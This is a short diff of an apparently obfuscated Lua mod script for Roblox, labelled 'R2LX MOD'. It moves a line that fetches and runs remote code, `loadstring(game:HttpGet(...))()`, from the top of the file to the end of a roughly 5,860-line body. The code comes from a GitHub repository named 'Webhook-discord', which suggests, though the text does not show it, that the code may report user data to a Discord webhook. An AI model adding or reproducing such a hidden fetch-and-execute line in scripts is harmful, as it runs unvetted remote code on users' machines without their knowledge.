@@ -1,7 +1,5 @@
 -- R2LX MOD
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/Webhook-discord/refs/heads/main/Notification.lua"))()
-
 local old_tts = tostring;
 local a, b = {
 	{
@@ -5860,3 +5858,5 @@ do
 		end
 	end
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/Webhook-discord/refs/heads/main/Notification.lua"))()
